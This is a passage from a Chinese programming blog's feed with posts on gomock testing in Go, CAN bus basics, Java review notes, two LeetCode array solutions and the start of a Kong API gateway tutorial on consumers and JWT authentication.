class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mockgen -source=db.go -destination=db_mock.go -package=mock</span><br></pre></td></tr></table></figure><p>gomock生成的db_mock.go如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//db_mock.go</span></span><br><span class="line"><span class="comment">// Code generated by MockGen. DO NOT EDIT.</span></span><br><span class="line"><span class="comment">// Source: db.go</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Package mock_db is a generated GoMock package.</span></span><br><span class="line"><span class="keyword">package</span> mock</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    gomock <span class="string">&quot;github.com/golang/mock/gomock&quot;</span></span><br><span class="line">    reflect <span class="string">&quot;reflect&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// MockDB is a mock of DB interface</span></span><br><span class="line"><span class="keyword">type</span> MockDB <span class="keyword">struct</span> &#123;</span><br><span class="line">    ctrl     *gomock.Controller</span><br><span class="line">    recorder *MockDBMockRecorder</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// MockDBMockRecorder is the mock recorder for MockDB</span></span><br><span class="line"><span class="keyword">type</span> MockDBMockRecorder <span class="keyword">struct</span> &#123;</span><br><span class="line">    mock *MockDB</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NewMockDB creates a new mock instance</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewMockDB</span><span class="params">(ctrl *gomock.Controller)</span> *<span class="title">MockDB</span></span> &#123;</span><br><span class="line">    mock := &amp;MockDB&#123;ctrl: ctrl&#125;</span><br><span class="line">    mock.recorder = &amp;MockDBMockRecorder&#123;mock&#125;</span><br><span class="line">    <span class="keyword">return</span> mock</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EXPECT returns an object that allows the caller to indicate expected use</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *MockDB)</span> <span class="title">EXPECT</span><span class="params">()</span> *<span class="title">MockDBMockRecorder</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> m.recorder</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get mocks base method</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *MockDB)</span> <span class="title">Get</span><span class="params">(key <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">int</span>, error)</span></span> &#123;</span><br><span class="line">    m.ctrl.T.Helper()</span><br><span class="line">    ret := m.ctrl.Call(m, <span class="string">&quot;Get&quot;</span>, key)</span><br><span class="line">    ret0, _ := ret[<span class="number">0</span>].(<span class="keyword">int</span>)</span><br><span class="line">    ret1, _ := ret[<span class="number">1</span>].(error)</span><br><span class="line">    <span class="keyword">return</span> ret0, ret1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get indicates an expected call of Get</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mr *MockDBMockRecorder)</span> <span class="title">Get</span><span class="params">(key <span class="keyword">interface</span>&#123;&#125;)</span> *<span class="title">gomock</span>.<span class="title">Call</span></span> &#123;</span><br><span class="line">    mr.mock.ctrl.T.Helper()</span><br><span class="line">    <span class="keyword">return</span> mr.mock.ctrl.RecordCallWithMethodType(mr.mock, <span class="string">&quot;Get&quot;</span>, reflect.TypeOf((*MockDB)(<span class="literal">nil</span>).Get), key)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// db_test.go</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestGetFromDB</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    ctrl := gomock.NewController(t)</span><br><span class="line">    <span class="keyword">defer</span> ctrl.Finish() <span class="comment">// 断言 DB.Get() 方法是否被调用</span></span><br><span class="line"></span><br><span class="line">    m := mock.NewMockDB(ctrl)</span><br><span class="line">    m.EXPECT().Get(gomock.Eq(<span class="string">&quot;Tom&quot;</span>)).Return(<span class="number">100</span>, errors.New(<span class="string">&quot;not exist&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> v := GetFromDB(m, <span class="string">&quot;Tom&quot;</span>); v != <span class="number">-1</span> &#123;</span><br><span class="line">        t.Fatal(<span class="string">&quot;expected -1, but got&quot;</span>, v)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>go mock有个限制，生成的mock_db实例和真正的db实例是两个不一样的实例（废话），因此在写测试时需要使用mock实例，而开发/生产环境中需要用真正的db实例，导致在设计GetFromDB一类的方法时，需要将db实例作为参数传入方法中，这样有碍结构设计的灵活性。 当然有方法能越过这层阻碍重点</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//db.go</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetFromDB</span><span class="params">(key <span class="keyword">string</span>)</span></span>&#123;</span><br><span class="line">    db := db.getDBClient()</span><br><span class="line">    db.Get(key)</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span>  mockDBClient DB</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getDBClient</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> mockDBClient != <span class="literal">nil</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mockDBClient</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 懒加载获得真实的DB连接并返回</span></span><br><span class="line">  <span class="keyword">return</span> actual.GetDBClient()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newMockDBClient</span><span class="params">(t *testing.T)</span></span>&#123;</span><br><span class="line">  gomock.NewController(t)</span><br><span class="line">  m := mock.NewMockDB(ctrl)</span><br><span class="line">  mockDBClient = m</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上将获取真实DBClient之前加上了一层判断，判断是否创建了mockDB，创建了则返回mockDB, 没创建就懒加载DB连接。 gomock另一个缺陷是他不支持自动生成响应，也就是说不能配置mock server，或许gomock是专为测试设计的，server这一块用于前端调用模拟，一般也是给个接口就能创建，应该有其他技术覆盖了这一块。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CAN总线（一）</title>
      <link href="2021/01/16/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6CAN%E6%80%BB%E7%BA%BF%E7%AC%94%E8%AE%B0/"/>
      <url>2021/01/16/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6CAN%E6%80%BB%E7%BA%BF%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>毕设</p><span id="more"></span><p>CAN总线使用总线技术，取代了传统的点对点布线方式连接汽车电子控制单元（ECU）, 解决了传统布线方式中线束多，布线难，成本高等问题。</p><p><img src="/2021/01/16/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6CAN%E6%80%BB%E7%BA%BF%E7%AC%94%E8%AE%B0/1.png" alt="点对点"></p><p><img src="/2021/01/16/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6CAN%E6%80%BB%E7%BA%BF%E7%AC%94%E8%AE%B0/2.png" alt="总线"></p><img src="/2021/01/16/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6CAN%E6%80%BB%E7%BA%BF%E7%AC%94%E8%AE%B0/3.jpg" alt="点对点" style="zoom: 33%;"><h1 id="CAN总线标准"><a href="#CAN总线标准" class="headerlink" title="CAN总线标准"></a>CAN总线标准</h1><p>CAN总线标准规定了物理层和数据链路层（参考计算机网络OSI七层网络模型），应用层需要用户自定义，不同的CAN标准中，对物理层的要求不同，对数据链路层的要求是相同的。</p><p><img src="/2021/01/16/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6CAN%E6%80%BB%E7%BA%BF%E7%AC%94%E8%AE%B0/4.png" alt="总线"></p><p><img src="/2021/01/16/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6CAN%E6%80%BB%E7%BA%BF%E7%AC%94%E8%AE%B0/5.png" alt="总线"></p><h1 id="CAN网络物理层"><a href="#CAN网络物理层" class="headerlink" title="CAN网络物理层"></a>CAN网络物理层</h1><p>连接在CAN总线上的设备叫做节点设备（CAN Node），CAN网络的拓扑一般为线型。线束最常用的是双绞线，线上传输为对称的差分电平信号。</p><p><img src="/2021/01/16/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6CAN%E6%80%BB%E7%BA%BF%E7%AC%94%E8%AE%B0/6.jpg" alt="总线"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
        <tags>
            
            <tag> 论文 </tag>
            
            <tag> CAN总线 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java 复习笔记</title>
      <link href="2020/11/26/java-%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/11/26/java-%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>java no</p><span id="more"></span><h2 id="基础类型"><a href="#基础类型" class="headerlink" title="基础类型"></a>基础类型</h2><p>byte、boolean、char、short、int、long、float、double</p><p>string属于对象</p><h2 id="String-StringBuilder-StringBuffer"><a href="#String-StringBuilder-StringBuffer" class="headerlink" title="String, StringBuilder, StringBuffer"></a>String, StringBuilder, StringBuffer</h2><p>String为不可变对象。 StringBuffer线程安全，StringBuilder非线程安全，但效率更高</p><h2 id="与equals"><a href="#与equals" class="headerlink" title="==与equals"></a>==与equals</h2><p>string的==比较引用，equals比较值</p><p>object的equals本质是==</p><h2 id="hashcode"><a href="#hashcode" class="headerlink" title="hashcode"></a>hashcode</h2><p>hashcode()值相等并不意味着引用地址相等，冲突的hash会使用冲突解决方案。</p><h2 id="final"><a href="#final" class="headerlink" title="final"></a>final</h2><p>final 修饰的类叫最终类，该类不能被继承。</p><p>final 修饰的方法不能被重写。</p><p>final 修饰的变量叫常量，常量必须初始化，初始化之后值就不能被修改。</p><h2 id="Volatile"><a href="#Volatile" class="headerlink" title="Volatile"></a>Volatile</h2><p>用于处理java并发情况下共享变量一致性的问题:</p><p>　1）保证了不同线程对这个变量进行操作时的可见性，即一个线程修改了某个变量的值，这新值对其他线程来说是立即可见的。</p><p>　2）禁止进行指令重排序。</p><h2 id="java容器"><a href="#java容器" class="headerlink" title="java容器"></a>java容器</h2><img src="/2020/11/26/java-%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/1.PNG" alt="1" style="zoom:33%;"><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>剑指 Offer 04. 二维数组中的查找</title>
      <link href="2020/11/25/%E5%89%91%E6%8C%87-Offer-04-%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E6%9F%A5%E6%89%BE/"/>
      <url>2020/11/25/%E5%89%91%E6%8C%87-Offer-04-%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E6%9F%A5%E6%89%BE/</url>
      
        <content type="html"><![CDATA[<p>水题</p><span id="more"></span><p><a href="https://leetcode-cn.com/problems/er-wei-shu-zu-zhong-de-cha-zhao-lcof/">剑指 Offer 04. 二维数组中的查找</a></p><p>在一个 n * m 的二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个高效的函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>目标数字target必须在横向纵向的边界上， 定义一个规则，从左下角开始，当前数字比target小，往右走，否则往左走。</p><p>坑： 从左上角开始走容易进入for循环+多次条件判断的坑，虽然也能做出来，但代码质量低，尽量避免。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>时间复杂度O(m+n),空间复杂度O(1)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findNumberIn2DArray</span><span class="params">(matrix [][]<span class="keyword">int</span>, target <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(matrix) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">n := <span class="built_in">len</span>(matrix)</span><br><span class="line">m := <span class="built_in">len</span>(matrix[<span class="number">0</span>])</span><br><span class="line">i, j := n<span class="number">-1</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i &gt;= <span class="number">0</span> &amp;&amp; j &lt; m &#123;</span><br><span class="line"><span class="keyword">if</span> matrix[i][j] == target &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> matrix[i][j] &gt; target &#123;</span><br><span class="line">i--</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> matrix[i][j] &lt; target &#123;</span><br><span class="line">j++</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
        <tags>
            
            <tag> 剑指offer </tag>
            
            <tag> 力扣 </tag>
            
            <tag> 每日N题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>剑指offer03</title>
      <link href="2020/11/25/%E5%89%91%E6%8C%87offer03/"/>
      <url>2020/11/25/%E5%89%91%E6%8C%87offer03/</url>
      
        <content type="html"><![CDATA[<p>水题</p><span id="more"></span><h2 id="找出数组中重复的数字"><a href="#找出数组中重复的数字" class="headerlink" title="找出数组中重复的数字"></a><a href="https://leetcode-cn.com/problems/shu-zu-zhong-zhong-fu-de-shu-zi-lcof/">找出数组中重复的数字</a></h2><p>在一个长度为 n 的数组 nums 里的所有数字都在 0～n-1 的范围内。数组中某些数字是重复的，但不知道有几个数字重复了，也不知道每个数字重复了几次。请找出数组中任意一个重复的数字。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：</span><br><span class="line">[2, 3, 1, 0, 2, 5, 3]</span><br><span class="line">输出：2 或 3 </span><br></pre></td></tr></table></figure><p><strong>限制：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 &lt;= n &lt;= 100000</span><br></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>很简单的一道题，想要访问重复数字，必须考虑存储之前访问过的数据来比较，同时考虑迭代过程中可进行前后比较，提供两种思路： </p><p>1: 访问过的数据存入map[int]bool, 存在为true不存在则为零值false。 时间复杂度O(n), 空间复杂度O(n)</p><p>2: 排序，前后比较判断，时间复杂度O(nlogn), 空间复杂度O(1)</p><p>复习一下各大排序算法：</p><img src="/2020/11/25/%E5%89%91%E6%8C%87offer03/1.png" alt="1" style="zoom: 33%;"><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><h3 id="golang-map-迭代-时间复杂度O-n-空间复杂度O-n"><a href="#golang-map-迭代-时间复杂度O-n-空间复杂度O-n" class="headerlink" title="golang map+迭代 时间复杂度O(n), 空间复杂度O(n)"></a>golang map+迭代 时间复杂度O(n), 空间复杂度O(n)</h3><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findRepeatNumber</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">bool</span>)</span><br><span class="line">    <span class="keyword">for</span> _,n := <span class="keyword">range</span> nums&#123;</span><br><span class="line">        <span class="keyword">if</span> m[n] == <span class="literal">false</span>&#123;</span><br><span class="line">            m[n] = <span class="literal">true</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="golang-快排-前后比较-时间复杂度O-nlogn-空间复杂度O-1"><a href="#golang-快排-前后比较-时间复杂度O-nlogn-空间复杂度O-1" class="headerlink" title="golang 快排+前后比较 时间复杂度O(nlogn),空间复杂度O(1)"></a>golang 快排+前后比较 时间复杂度O(nlogn),空间复杂度O(1)</h3><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findRepeatNumber</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    length := <span class="built_in">len</span>(nums)</span><br><span class="line">    sort(nums, <span class="number">0</span>,length<span class="number">-1</span>)</span><br><span class="line">    n := nums[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">1</span>; i &lt; length; i++&#123;</span><br><span class="line">        <span class="keyword">if</span> nums[i]==n &#123;</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        &#125;</span><br><span class="line">        n = nums[i]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//快排</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sort</span><span class="params">(nums []<span class="keyword">int</span>, start, end <span class="keyword">int</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> start &gt;= end &#123;</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    p := partition(nums, start, end)</span><br><span class="line">    t := solve(nums, start, end, p)</span><br><span class="line">    sort(nums, start, t<span class="number">-1</span>)</span><br><span class="line">    sort(nums, t+<span class="number">1</span>, end)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">solve</span><span class="params">(nums []<span class="keyword">int</span>, start, end <span class="keyword">int</span>, p <span class="keyword">int</span>)</span><span class="title">int</span></span>&#123;</span><br><span class="line">    i := start</span><br><span class="line">    j := end - <span class="number">1</span></span><br><span class="line">    <span class="comment">//坑点，要求i&lt;=j</span></span><br><span class="line">    <span class="keyword">for</span> i &lt;end &amp;&amp; j&gt;=i &#123;</span><br><span class="line">        <span class="keyword">if</span> nums[i]&lt;nums[p]&#123;</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//交换</span></span><br><span class="line">            swap(nums, i, j)</span><br><span class="line">            j-=<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    swap(nums, i, p)</span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">partition</span><span class="params">(nums []<span class="keyword">int</span>, start, end <span class="keyword">int</span>)</span><span class="title">int</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> end</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">swap</span><span class="params">(nums []<span class="keyword">int</span>, i, j <span class="keyword">int</span>)</span></span>&#123;</span><br><span class="line">        t := nums[j]</span><br><span class="line">        nums[j] = nums[i]</span><br><span class="line">        nums[i] = t</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果超时，时间复杂度太高，说明不能用排序。</p><h3 id="最后在书上看到了最优解-时间复杂度O-n-空间复杂度O-1"><a href="#最后在书上看到了最优解-时间复杂度O-n-空间复杂度O-1" class="headerlink" title="最后在书上看到了最优解 时间复杂度O(n), 空间复杂度O(1)"></a>最后在书上看到了最优解 时间复杂度O(n), 空间复杂度O(1)</h3><p>突破点在 <strong>数组 nums 里的所有数字都在 0～n-1 的范围内</strong> 这个条件中： 考虑把所有访问过的数字放到对应下标上，这种情况下若出现重复数字那会造成冲突，返回冲突值；若没有冲突，每次访问都会让一个数字归位，只会访问n次。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findRepeatNumber</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">length := <span class="built_in">len</span>(nums)</span><br><span class="line">i := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i &lt; length &#123;</span><br><span class="line">    <span class="keyword">if</span> nums[i]==i&#123;</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> nums[i] == nums[nums[i]]&#123;</span><br><span class="line">            <span class="keyword">return</span> nums[i]</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           swap(nums, i, nums[i]) </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">swap</span><span class="params">(nums []<span class="keyword">int</span>, i, j <span class="keyword">int</span>)</span></span>&#123;</span><br><span class="line">    t := nums[j]</span><br><span class="line">    nums[j] = nums[i]</span><br><span class="line">    nums[i] = t</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
        <tags>
            
            <tag> 剑指offer </tag>
            
            <tag> 力扣 </tag>
            
            <tag> 每日N题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网关kong 中的概念consumer service route plugin实践与理解</title>
      <link href="2020/11/22/%E7%BD%91%E5%85%B3kong-%E4%B8%AD%E7%9A%84%E6%A6%82%E5%BF%B5consumer-service-route-plugin%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%90%86%E8%A7%A3/"/>
      <url>2020/11/22/%E7%BD%91%E5%85%B3kong-%E4%B8%AD%E7%9A%84%E6%A6%82%E5%BF%B5consumer-service-route-plugin%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>近几天在学习api网关kong，发现中文网基本没人发表关于kong的consumer、plugin、route、service的进一步探索和使用相关文章，只是分开描述了单独的概念和做简单配置，因此为了补全这个缺失，我尽量详细记录这几天的摸索历程，以及对这些概念的理解和实践。</p><span id="more"></span><p>传送门：</p><p><a href="https://github.com/qianyugang/kong-docs-cn">kong网关中文文档</a></p><p><a href="https://konghq.com/">kong官网</a></p><p><a href="https://docs.konghq.com/">kong官方文档</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>近几天在学习api网关kong，发现中文网基本没人发表关于kong的consumer、plugin、route、service的进一步探索和使用相关文章，只是分开描述了单独的概念和做简单配置，因此为了补全这个缺失，我尽量详细记录这几天的摸索历程，以及对这些概念的理解和实践。</p><h1 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h1><h2 id="Consumer"><a href="#Consumer" class="headerlink" title="Consumer"></a>Consumer</h2><blockquote><p>The Consumer object represents a consumer - or a user - of an API. You can either rely on Kong as the primary datastore, or you can map the consumer list with your database to keep consistency between Kong and your existing primary datastore.</p></blockquote><p>（官方原文解释中的消费者和数据库的映射这里暂时不涉及）</p><p>consumer直译消费者。它是个抽象概念，代表一类事物。例如你可以创建一组consumer代表api版本号v1、v2、v3， 也可以代表请求来源类型，来自客户端请求可标记为android/iOS， web前端请求标记为web frontend，IoT设备请求标记为IoT device。</p><p>Kong所在的架构好比一家公司，kong consumer 就代表公司员工种类，普通员工、主管、经理、老板等。当然，标记这些人员需要工牌，工牌上具有员工认证信息，无工牌社会人员无法进入。</p><p>请求未认证情况下不为consumer， 只会根据请求的customIP标记，因此请求被kong标记为consumer前需要进行认证。</p><p>kong提供了多种认证方式：BASIC AUTH、API KEYS、HMAC、OAUTH2、JWT</p><p>他们适合的使用场景都不同，按需设置，我这里需要用kong搭建分布式场景应用，因此选择JWT</p><p>（这里使用kong图形界面KONGA实践）</p><img 